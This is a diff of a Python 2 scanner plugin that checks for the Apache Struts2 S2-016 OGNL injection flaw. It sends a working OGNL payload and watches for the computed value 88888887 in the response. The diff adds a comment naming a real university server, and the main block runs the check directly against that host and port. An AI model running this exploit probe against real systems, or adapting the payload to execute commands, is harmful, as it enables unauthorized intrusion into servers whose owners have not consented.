@@ -1,14 +1,13 @@
 #!/usr/bin/env python
 # encoding: utf-8
-from ..t import T
-# from t  import T
+# from ..t import T
+from t  import T
 import requests
 class P(T):
     def __init__(self):
         T.__init__(self)
         keywords=['struts']
     def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
-        target_url = ''
         target_url = 'http://' + ip + ':' + port
 
         if productname.get('path', ''):
@@ -26,6 +25,7 @@ class P(T):
         res=None
         payload = "method:%23_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(88888888-1),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" #
 
+        # http://gimssom.bnuz.edu.cn:8089/login.action
         print target_url
         try:
             headers = {"Content-Type":"application/x-www-form-urlencoded"}
@@ -38,11 +38,7 @@ class P(T):
             if res is not None:
                 res.close()
                 del res
-                
-                
         if res_html.find("88888887") <> -1:
-      
-
             info = target_url + "struts016  Vul"
             result['result']=True
             result['VerifyInfo'] = {}
@@ -56,7 +52,3 @@ class P(T):
 
 if __name__ == '__main__':
     print P().verify(ip='gimssom.bnuz.edu.cn',port='8089')                
-            
-            
-            
-            
